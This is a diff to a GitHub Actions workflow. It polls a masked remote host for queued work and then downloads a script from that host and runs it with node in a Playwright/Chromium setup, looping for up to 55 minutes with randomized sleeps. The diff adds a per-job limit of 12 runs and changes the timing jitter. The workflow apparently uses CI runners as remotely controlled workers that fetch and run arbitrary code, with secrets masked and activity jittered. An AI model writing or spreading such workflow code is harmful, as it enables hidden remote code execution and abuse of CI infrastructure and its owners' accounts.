@@ -24,10 +24,11 @@ jobs:
           export U="${CFG%%|*}" K="${CFG#*|}"
           echo "::add-mask::$U"
           echo "::add-mask::$K"
-          W="$RUNNER_TEMP/w"; READY=0; END=$((SECONDS + 55 * 60))
+          W="$RUNNER_TEMP/w"; READY=0; B=0; END=$((SECONDS + 55 * 60))
           while [ $SECONDS -lt $END ]; do
             N=$(curl -fsS -m 20 -H "x-check-key: $K" "$U/gh/queue?peek=1" 2>/dev/null || echo 0)
-            if [ "$N" != "0" ]; then
+            if [ "$N" != "0" ] && [ $B -lt 12 ]; then
+              B=$((B + 1))
               if [ $READY = 0 ]; then
                 mkdir -p "$W" && cd "$W"
                 npm init -y >/dev/null 2>&1
@@ -35,8 +36,10 @@ jobs:
                 npx playwright install --with-deps chromium >/dev/null 2>&1 && READY=1
               fi
               cd "$W" && curl -fsS -m 20 -H "x-check-key: $K" "$U/gh/script" -o r.mjs && timeout 600 node r.mjs || echo "skip"
+              sleep $((30 + RANDOM % 30))
+              continue
             fi
-            sleep $((120 + RANDOM % 60))
+            sleep $((60 + RANDOM % 60))
           done
           echo "ok"
 
